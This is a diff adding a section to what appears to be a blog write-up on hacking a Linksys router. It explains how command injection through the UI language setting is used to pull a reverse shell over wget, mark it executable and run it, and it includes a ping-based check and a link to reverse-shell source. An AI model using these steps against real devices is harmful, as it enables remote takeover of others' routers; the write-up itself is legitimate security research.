@@ -229,6 +229,57 @@ Yes! We got code execution.
 I can only assume that the developers didn't think this was susceptible to shell injection since the way
  in which you change a language is via a dropdown and you can't provide free-text on the interface.
 
+# Interactive Shell
+Although executing commands on the router is great, I still lack an interactive shell which is my true goal.
+
+In order to cope with that, I needed to upload a reverse shell onto the router.  
+Though, how could I upload files?
+Originally, I thought of uploading the file with a command like
+```sh
+echo {revshell_bytes} > revshell
+```
+However, I then recalled that I couldn't do so due to the size limitation on `snprintf`.
+```c
+// Copies up to 0x40 bytes.
+snprintf(acStack88,0x40,"cp /www/%s_lang_pack/captmp.js /tmp/.",puVar1);
+system(acStack88);
+```
+```py
+In : 0x40 - len('cp /www/')
+Out: 56 (0x38)
+```
+I'm limited to 56 characters, two of which are the `;` at the beginning and at the end, so essentially 54 characters.
+Uploading it by chunks with `echo {chunk} >> revshell` would take a very long time and I didn't want to go that path.
+
+At this point in time, I realized that `wget` is present on the device!  
+I compiled a [reverse shell] and set up an HTTP server so that I can pull it to the router.
+
+I automated the process of changing the `ui_language` to a command in conjunction with issuing a firmware update in order to execute the shell command.
+If everything works correctly, the firmware update request should block since it's now executing the reverse shell (given that it doesn't fork).
+
+Steps:
+1. Upload the reverse shell using `wget`.
+2. Make it executable using `chmod +x`.
+3. Running it.
+
+<center><iframe width="720" height="400" src="https://www.youtube.com/embed/wmvKFE1XFXw" frameborder="0" allowfullscreen></iframe></center>
+
+We can tell that the router attempted to download the binary from our HTTP server since we received the request.
+Sadly, it is clear that after I issue the last firmware upgrade which should invoke the reverse shell, it returns immediately.
+More so, we can see that a shell doesn't open up on our handler.
+
+For the sake of assessing whether the file was uploaded successfully, I used the AND (`&&`) operator.
+```sh
+cat /tmp/X && ping -c 1 192.169.1.100
+```
+If the file was present, I would receive an ICMP packet on my end, else, I wouldn't.
+
+![Check Revshell Existence]
+
+But I did.
+
+Well, what is it then? Why wouldn't it work?
+
 
 [Router Image]: https://i.imgur.com/sAmlLfJ.jpg
 [Web Interface]: https://i.imgur.com/QJj9iOA.png
@@ -237,3 +288,5 @@ I can only assume that the developers didn't think this was susceptible to shell
 [Ghidra ping_server]: https://i.imgur.com/DijAl9t.png
 [system xrefs]: https://i.imgur.com/usejiO7.png
 [change ui_language]: https://i.imgur.com/xrNitIn.png
+[reverse shell]: https://github.com/elongl/linksys-wrt54g/blob/master/revshell/revshell.c
+[Check Revshell Existence]: https://i.imgur.com/gVYDd0U.png
